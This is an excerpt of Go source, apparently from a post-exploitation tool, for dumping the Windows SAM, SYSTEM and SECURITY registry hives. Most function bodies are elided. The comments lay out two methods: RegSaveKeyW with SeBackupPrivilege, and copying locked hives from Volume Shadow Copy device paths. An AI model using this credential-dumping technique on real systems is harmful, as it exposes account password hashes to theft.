...
//
// Strategy (in order):
//  1. RegSaveKeyW — cleanest; requires SeBackupPrivilege (SYSTEM/elevated).
//  2. Volume Shadow Copy fallback — copies locked hive files from the most
//     recent VSS snapshot without SeBackupPrivilege.
func dumpSAM(outDir string) (string, error) {
	var results []string

	// ── Attempt 1: RegSaveKeyW ────────────────────────────────────────────────
...
// dumpSAMRegSave uses RegSaveKeyW to dump hives.  Caller must have already
...
// dumpSAMVSS copies the locked SAM/SYSTEM/SECURITY hives from the most recent
// Volume Shadow Copy snapshot.
//
// VSS device paths follow the pattern:
//
//	\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopyN\Windows\System32\config\<hive>
//
// We iterate N=1..64 and use the first snapshot that contains the SAM file.
// No COM/WMI — just direct device path access via CreateFileW.
func dumpSAMVSS(outDir string) (string, error) {
	...
	// Find the highest-numbered shadow copy that has a readable SAM.
	foundN := 0
...
// openVSSFile opens a VSS device-path file for reading via CreateFileW.
// Returns the raw handle so callers can probe existence without io overhead.
...
// vssFileCopy reads src (VSS device path) and writes it to dst using Go's
// standard io — works because os.Open ultimately calls CreateFileW.
